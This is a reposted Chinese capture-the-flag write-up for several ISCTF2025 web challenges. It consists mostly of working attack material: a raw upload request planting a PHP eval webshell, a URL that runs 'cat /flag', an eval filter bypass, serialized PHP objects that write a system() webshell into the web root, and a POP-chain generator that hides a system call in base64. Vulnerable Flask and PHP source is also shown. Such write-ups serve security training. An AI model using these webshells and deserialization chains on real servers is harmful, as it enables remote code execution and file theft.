# ISCTF2025 部分web

> 原文: https://www.ctfiot.com/286532.html
> ID: 286532

b@by n0t1ce b0ard

在http://challenge.bluesharkinfo.com:20796/registration.php 传入php文件

POST /registration.php HTTP/1.1Host: challenge.bluesharkinfo.com:20796Content-Length: 1167Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Origin: http://challenge.bluesharkinfo.com:20796Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh9UWemEvKSJP11UPUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge.bluesharkinfo.com:20796/registration.phpAccept-Encoding: gzip, deflate, brCookie: PHPSESSID=3ce539671e19b6fb4c984e0f0581a917Connection: keep-alive------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="n"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="e"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="p"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mob"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="gen"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="hob[]"reading------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="img"; filename="basic_webshell.php"Content-Type: application/octet-stream<?php @eval($_GET['attack']);?>------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="yy"1951------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mm"2------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="dd"3------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="save"Save------WebKitFormBoundaryh9UWemEvKSJP11UP--

访问 url/images/test/basic_webshell.php?attack=system(%22cat%20/flag%22);

ezrce

<?phphighlight_file(__FILE__);if(isset($_GET['code'])){ $code=$_GET['code']; if(preg_match('/^[A-Za-z()_;]+$/',$code)) { eval($code); }else{ die('师傅，你想拿flag？'); }}

?code=eval(end(current(get_defined_vars())));&b=system("cat%20/flag");

flag到底在哪

username=admin password=sql注入 跳转到upload

这个就上传 一句话木马就行

来签个到吧

漏洞点


```
POST /registration.php HTTP/1.1Host: challenge.bluesharkinfo.com:20796Content-Length: 1167Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Origin: http://challenge.bluesharkinfo.com:20796Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh9UWemEvKSJP11UPUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge.bluesharkinfo.com:20796/registration.phpAccept-Encoding: gzip, deflate, brCookie: PHPSESSID=3ce539671e19b6fb4c984e0f0581a917Connection: keep-alive------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="n"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="e"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="p"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mob"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="gen"test------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="hob[]"reading------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="img"; filename="basic_webshell.php"Content-Type: application/octet-stream<?php @eval($_GET['attack']);?>------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="yy"1951------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="mm"2------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="dd"3------WebKitFormBoundaryh9UWemEvKSJP11UPContent-Disposition: form-data; name="save"Save------WebKitFormBoundaryh9UWemEvKSJP11UP--
```



```
<?phphighlight_file(__FILE__);if(isset($_GET['code'])){ $code=$_GET['code']; if(preg_match('/^[A-Za-z()_;]+$/',$code)) { eval($code); }else{ die('师傅，你想拿flag？'); }}
```



```
blueshark:O:12:"ShitMountant":2:{s:3:"url";s:12:"file:///flag";s:6:"logger";N;}尝试读取文件发现不行，看看写入文件
```



```
blueshark:O:10:"FileLogger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:7:"content";s:28:"<?php system($_GET['c']); ?>";}
```



```
from flask import Flask,request,render_template,redirect,url_forimport jsonimport pydashapp=Flask(__name__)database={}data_index=0name=''@app.route('/',methods=['GET'])def index(): returnrender_template('login.html')@app.route('/register',methods=['GET'])def register(): returnrender_template('register.html')@app.route('/registerV2',methods=['POST'])def registerV2(): username=request.form['username'] password=request.form['password'] password2=request.form['password2'] ifpassword!=password2: return''' <script> alert('前后密码不一致，请确认后重新输入。'); window.location.href='/register'; </script> ''' else: global data_index data_index+=1 database[data_index]=username database[username]=password returnredirect(url_for('index'))@app.route('/user_dashboard',methods=['GET'])def user_dashboard(): returnrender_template('dashboard.html')@app.route('/272e1739b89da32e983970ece1a086bd',methods=['GET'])def A272e1739b89da32e983970ece1a086bd(): returnrender_template('admin.html')@app.route('/operate',methods=['GET'])def operate(): username=request.args.get('username') password=request.args.get('password') confirm_password=request.args.get('confirm_password') ifusernameinglobals() and"old"notinpassword: Username=globals()[username] try: pydash.set_(Username,password,confirm_password) return"oprate success" except: return"oprate failed" else: return"oprate failed"@app.route('/user/name',methods=['POST'])def name(): return{'username':user}deflogout(): returnredirect(url_for('index'))@app.route('/reset',methods=['POST'])def reset(): old_password=request.form['old_password'] new_password=request.form['new_password'] ifuserindatabase and database[user] == old_password: database[user]=new_password return''' <script> alert('密码修改成功，请重新登录。'); window.location.href='/'; </script> ''' else: return''' <script> alert('密码修改失败，请确认旧密码是否正确。'); window.location.href='/user_dashboard'; </script> '''@app.route('/impression',methods=['GET'])def impression(): point=request.args.get('point') iflen(point) > 5: return"Invalid request" List=["{","}",".","%","<",">","_"] foriinpoint: ifiinList: return"Invalid request" returnrender_template(point)@app.route('/login',methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] type=request.form['type'] ifusernameindatabase and database[username] != password: return''' <script> alert('用户名或密码错误请重新输入。'); window.location.href='/'; </script> ''' elifusername notindatabase: return''' <script> alert('用户名或密码错误请重新输入。'); window.location.href='/'; </script> ''' else: global name name=username ifint(type)==1: returnredirect(url_for('user_dashboard')) elifint(type)==0: returnredirect(url_for('A272e1739b89da32e983970ece1a086bd'))if__name__=='__main__': app.run(host='0.0.0.0',port=8080,debug=False)
```



```
@app.route('/operate',methods=['GET'])def operate(): username=request.args.get('username') password=request.args.get('password') confirm_password=request.args.get('confirm_password') ifusernameinglobals() and"old"notinpassword: Username=globals()[username] try: pydash.set_(Username,password,confirm_password) return"oprate success" except: return"oprate failed" else: return"oprate failed"
```



```
@app.route('/impression',methods=['GET'])def impression(): point=request.args.get('point') iflen(point) > 5: return"Invalid request" List=["{","}",".","%","<",">","_"] foriinpoint: ifiinList: return"Invalid request" returnrender_template(point)
```



```
<?phperror_reporting(0);class begin { public$var1; public$var2; function__construct($a) { $this->var1 =$a; } function__destruct() { echo$this->var1; } publicfunction__toString() { $newFunc=$this->var2; return$newFunc(); }}class starlord { public$var4; public$var5; public$arg1; publicfunction__call($arg1,$arg2) { $function=$this->var4; return$function(); } publicfunction__get($arg1) { $this->var5->ll2('b2'); }}class anna { public$var6; public$var7; publicfunction__toString() { $long= @$this->var6->add(); return$long; } publicfunction__set($arg1,$arg2) { if($this->var7->tt2) { echo"yamada yamada"; } }}class eenndd { public$command; publicfunction__get($arg1) { if(preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i",$this->command)){ echo"nonono"; }else{ eval($this->command); } }}class flaag { public$var10; public$var11="1145141919810"; publicfunction__invoke() { if(md5(md5($this->var11)) == 666) { return$this->var10->hey; } }}if(isset($_POST['ISCTF'])) { unserialize($_POST["ISCTF"]);}else{ highlight_file(__FILE__);}
```



```
<?phpclass begin { public$var1; public$var2; function__construct($a,$b) { $this->var1 =$a; $this->var2 =$b; }}class flaag { public$var10; public$var11;}class eenndd { public$command;}// 第一步：爆破md5(md5($x)) == 666的值// 弱类型比较，只需要md5(md5($x))以"666"开头// 可以通过爆破找到这样的值$found=false;$value="";for($i= 0;$i< 100000000;$i++) { $hash= md5(md5((string)$i)); if(substr($hash, 0, 3) ==="666") { $value= (string)$i; echo"Found:$value->$hashn"; $found=true; break; }}if(!$found) { // 如果没找到，可以使用字符串"1145141919810"的md5 // 先看看这个默认值 $hash1= md5("1145141919810"); $hash2= md5($hash1); echo"Default var11 hash:$hash2n";}// 第二步：构造对象链// 创建eenndd对象（最终执行命令）$end= new eenndd();// 需要绕过命令过滤，使用eval执行命令// 方法1：使用字符串拼接绕过过滤$end->command='$a=eval(base64_decode("c3lzdGVtKCJjYXQgL2ZsYWciKTs="));';// 方法2：使用反引号执行命令（但需要绕过空格过滤）//$end->command='echo `ls${IFS}/`;';// 方法3：使用exec或passthru（如果没被过滤）//$end->command='passthru("ls /");';// 创建flaag对象$flag= new flaag();$flag->var10 =$end; // 访问hey属性会触发eenndd::__get()$flag->var11 =$value?$value:"1145141919810";// 创建begin对象$beg= new begin($beg,$flag); // var1指向自己，var2指向flaag对象$beg->var1 =$beg; // 这样echo$this->var1会触发自身的__toString()$beg->var2 =$flag; // __toString()会调用var2()echo"序列化payload:n";echourlencode(serialize($beg));echo"nn";echo"begin对象: ". serialize($beg) ."n";
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500717-wxsync-2025-12-ee8f2b9efd90b73fc72f7323f3cec7b3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500718-wxsync-2025-12-d103a3aac9f3f92822fc88ec8611e0e5.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500719-wxsync-2025-12-d75f1d568eb2d3d404f0919c9157e976.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500721-wxsync-2025-12-6cfdc4f0acd7594ae94256e61d33359a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500723-wxsync-2025-12-6e37a398fdfd9a52a58823c33834a223.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500724-wxsync-2025-12-e9cc956729245730d8d6d9af4fd1ea95.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500726-wxsync-2025-12-30a10d6519ad8cd85010cc3e396c22b7.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500727-wxsync-2025-12-daba5bd90dea37aadd06d439f4639aec.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500729-wxsync-2025-12-f1d784052ee25c2603484ca82eb5d3ee.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/12/1765500732-wxsync-2025-12-ffe87754f965682ad06df170b255785f.png)